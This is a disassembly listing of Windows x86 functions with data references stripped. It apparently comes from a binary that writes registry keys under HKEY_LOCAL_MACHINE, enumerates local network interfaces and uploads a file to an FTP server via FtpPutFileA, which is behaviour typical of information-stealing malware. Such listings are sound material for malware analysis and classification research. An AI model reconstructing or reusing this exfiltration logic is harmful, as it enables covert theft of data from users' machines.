push j_sub_404b30#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx 0x1
mov edx r-xdata
mov eax ebx
call sub_4220e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4726dc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_47274f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx r-xdata
mov edx r-xdata
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4727cc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_472877
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx r-xdata
mov edx r-xdata
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_472924
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_472969
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call SetFileAttributesA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472970
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_472974
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4729d0
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40a5a0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4729d7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_4729dc
push ebp
mov ebp esp
add esp 0xfffffe14
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1ec ] ecx
mov [ ebp - 0x1e8 ] ecx
mov [ ebp - 0x1e4 ] ecx
mov [ ebp - 0x1e0 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xd ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_472c12
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_472bd6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0x1e0 ]
call sub_4719c8
lea eax [ ebp - 0x1e0 ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x1e0 ]
lea eax [ ebp - 0x1dc ]
call sub_403770
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x1e4 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov edx [ ebp - 0x1e4 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov edx [ ebp - 0x1e8 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
xor eax eax
push ebp
push sub_472b0d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x80
lea eax [ ebp - 0x1ec ]
call sub_4719c8
lea eax [ ebp - 0x1ec ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x1ec ]
call sub_4059dc
push eax
call SetFileAttributesA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405818
lea eax [ ebp - 0x1dc ]
call sub_403500
call sub_40305c
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x1dc ]
call sub_405cd0
call sub_4040ac
call sub_40305c
lea eax [ ebp - 0x1dc ]
call sub_403918
call sub_40305c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x1dc ]
call sub_4034f4
call sub_40305c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472c19
lea eax [ ebp - 0x1ec ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
lea eax [ ebp - 0x1dc ]
call sub_403abc
call sub_40305c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1dc ]
call sub_403cc4
lea eax [ ebp - 0x1dc ]
call sub_403d30
call sub_40305c
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4058e0
lea eax [ ebp - 0x1dc ]
call sub_403918
call sub_40305c
sub_472c70
push ebp
mov ebp esp
add esp 0xfffffe20
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1e0 ] edx
mov [ ebp - 0x1dc ] edx
mov [ ebp - 0x1d8 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
lea esi [ ebp - 0x1d4 ]
xor eax eax
push ebp
push sub_472de7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_472dab
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405530
lea eax [ ebp - 0x1d8 ]
call sub_4719c8
lea eax [ ebp - 0x1d8 ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x1d8 ]
mov eax esi
call sub_403770
push 0x80
lea eax [ ebp - 0x1dc ]
call sub_4719c8
lea eax [ ebp - 0x1dc ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x1dc ]
call sub_4059dc
push eax
call SetFileAttributesA
mov eax esi
call sub_4034f4
call sub_40305c
jmp r-xdata
mov eax esi
call sub_403abc
call sub_40305c
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_403cc4
mov eax esi
call sub_403d30
call sub_40305c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
mov eax esi
call sub_403918
call sub_40305c
lea edx [ ebp - 0x1e0 ]
mov eax [ ebp - 0x4 ]
call sub_409b7c
cmp [ ebp - 0x1e0 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472dee
lea eax [ ebp - 0x1e0 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_472e88
push ebp
mov ebp esp
add esp 0xfffff99c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x664 ] edx
mov [ ebp - 0x660 ] edx
mov [ ebp - 0x65c ] edx
mov esi eax
xor eax eax
push ebp
push sub_473108
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_405530
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47310f
lea eax [ ebp - 0x664 ]
mov edx 0x3
call sub_405554
retn
xor edx edx
push ebp
push sub_4730d5
push [ fs : edx ]
mov [ fs : edx ] esp
lea ebx [ ebp - 0x8 ]
push 0x0
push 0x0
push ebx
push 0x400
lea eax [ ebp - 0x658 ]
push eax
push 0x0
push 0x0
push 0x4004747f
mov eax [ ebp - 0x4 ]
push eax
call WSAIoctl
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0x4c
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
call closesocket
xor ebx ebx
inc eax
mov [ ebp - 0xc ] eax
lea ebx [ ebp - 0x654 ]
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
jmp r-xdata
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
jmp r-xdata
mov eax edi
and eax 0x2
cmp eax 0x2
jne r-xdata
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
jmp r-xdata
and edi 0x4
cmp edi 0x4
jne r-xdata
push esi
mov esi ebx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push [ ebp - 0x18 ]
call inet_ntoa
mov edi eax
push [ esi ]
push r-xdata
lea eax [ ebp - 0x65c ]
mov edx edi
call sub_405728
push [ ebp - 0x65c ]
push r-xdata
mov eax esi
mov edx 0x4
call sub_4058e0
push esi
lea esi [ ebx + 0x30 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push [ ebp - 0x18 ]
call inet_ntoa
mov edi eax
push [ esi ]
push r-xdata
lea eax [ ebp - 0x660 ]
mov edx edi
call sub_405728
push [ ebp - 0x660 ]
push r-xdata
mov eax esi
mov edx 0x4
call sub_4058e0
push esi
lea esi [ ebx + 0x18 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push [ ebp - 0x18 ]
call inet_ntoa
mov edi eax
push [ esi ]
push r-xdata
lea eax [ ebp - 0x664 ]
mov edx edi
call sub_405728
push [ ebp - 0x664 ]
push r-xdata
mov eax esi
mov edx 0x4
call sub_4058e0
mov edi [ ebx - 0x4 ]
mov eax edi
and eax 0x1
dec eax
jne r-xdata
push [ esi ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
add ebx 0x4c
dec [ ebp - 0xc ]
jne r-xdata
sub_473208
push ebp
mov ebp esp
add esp 0xfffff9a4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x65c ] edx
mov esi eax
xor eax eax
push ebp
push sub_473339
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_405530
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473340
lea eax [ ebp - 0x65c ]
call sub_405530
retn
xor edx edx
push ebp
push sub_47330b
push [ fs : edx ]
mov [ fs : edx ] esp
lea ebx [ ebp - 0x8 ]
push 0x0
push 0x0
push ebx
push 0x400
lea eax [ ebp - 0x658 ]
push eax
push 0x0
push 0x0
push 0x4004747f
mov eax [ ebp - 0x4 ]
push eax
call WSAIoctl
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0x4c
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
call closesocket
xor ebx ebx
inc eax
mov [ ebp - 0xc ] eax
lea ebx [ ebp - 0x654 ]
push esi
mov esi ebx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push [ ebp - 0x18 ]
call inet_ntoa
mov edi eax
lea eax [ ebp - 0x65c ]
mov edx edi
call sub_405728
mov edx [ ebp - 0x65c ]
mov eax esi
call sub_405818
push esi
lea esi [ ebx + 0x30 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ ebx + 0x18 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push [ ebp - 0x18 ]
call inet_ntoa
mov eax esi
mov edx r-xdata
call sub_405818
add ebx 0x4c
dec [ ebp - 0xc ]
jne r-xdata
sub_473358
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x10 ]
call sub_4059cc
mov eax [ ebp + 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_473438
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_473448
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47343f
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_405554
lea eax [ ebp + 0x8 ]
mov edx 0x3
call sub_405554
retn
xor eax eax
push ebp
push sub_473409
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
call sub_40a68c
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
call sub_405864
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_473560
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call sub_473540
retn
sub_473448
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_473525
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push r-xdata
call InternetOpenA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
mov [ rw-data ] 0x0
jmp r-xdata
push 0x0
push 0x8000000
push 0x1
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp + 0x8 ]
call sub_409edc
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ rw-data ]
push eax
call InternetConnectA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47352c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
jmp r-xdata
mov bl 0x1
mov [ rw-data ] 0x1
sub_473560
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4735d8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4735df
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor ebx ebx
push 0x0
push 0x2
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ rw-data ]
push eax
call FtpPutFileA
test eax eax
je r-xdata
mov bl 0x1
sub_4735e8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_47375f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_473725
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_473714
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47371b
mov eax [ ebp - 0x14 ]
call sub_404650
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_409b7c
mov eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_409b7c
mov edx [ ebp - 0x1c ]
pop eax
call sub_405974
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
sub_47371b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473766
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_47372a
mov eax [ ebp - 0x10 ]
call sub_405530
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473766
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_47377c
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_473916
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_405530
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47391d
lea eax [ ebp - 0x30 ]
mov edx 0x8
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48aab0
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4738e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409b7c
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x24 ]
xor ecx ecx
mov edx r-xdata
call sub_40ef44
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x30 ]
call sub_48bf2c
mov ecx [ ebp - 0x30 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x2c ]
call sub_405864
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
pop eax
call sub_4616b4
mov eax [ ebp - 0x10 ]
call sub_404650
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x20 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_489a38
test al al
je r-xdata
sub_473978
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_473a27
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx 0x104
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetWindowsDirectoryA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax esi
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a2e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_473a40
push ebx
add esp 0xfffffef8
mov ebx edx
push esp
push 0x0
push 0x0
push eax
push 0x0
call SHGetFolderPathA
test eax 0x80000000
sete al
neg al
sbb eax eax
test eax eax
je r-xdata
mov eax ebx
call sub_405530
mov eax ebx
mov edx esp
mov ecx 0x105
call sub_4057a0
jmp r-xdata
add esp 0x108
pop ebx
retn
sub_473a88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_473ad0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax 0x26
call sub_473a40
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx r-xdata
call sub_405864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473ad7
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_473b04
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_473b47
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_473978
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx r-xdata
call sub_405864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473b4e
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_473b6c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_473c15
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea edx [ ebp - 0x8 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4097dc
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x10 ]
call sub_473a88
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4097dc
mov edx [ ebp - 0xc ]
pop eax
call sub_405974
je r-xdata
mov bl 0x1
lea edx [ ebp - 0x18 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_4097dc
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
call sub_473b04
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_4097dc
mov edx [ ebp - 0x1c ]
pop eax
call sub_405974
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c1c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_405554
retn
sub_473c24
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_473cf8
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_473b6c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473cff
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
lea eax [ ebp - 0x4 ]
call sub_473a88
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_473b04
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
lea edx [ ebp - 0x8 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x8 ]
mov edx rw-data
call sub_473d08
test al al
je r-xdata
lea edx [ ebp - 0xc ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0xc ]
mov edx rw-data
call sub_473d08
test al al
je r-xdata
mov ecx [ rw-data ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_473f34
test eax eax
jbe r-xdata
mov ecx [ rw-data ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_473f34
test eax eax
jbe r-xdata
push 0x0
call ExitProcess
push 0x0
call ExitProcess
sub_473d08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
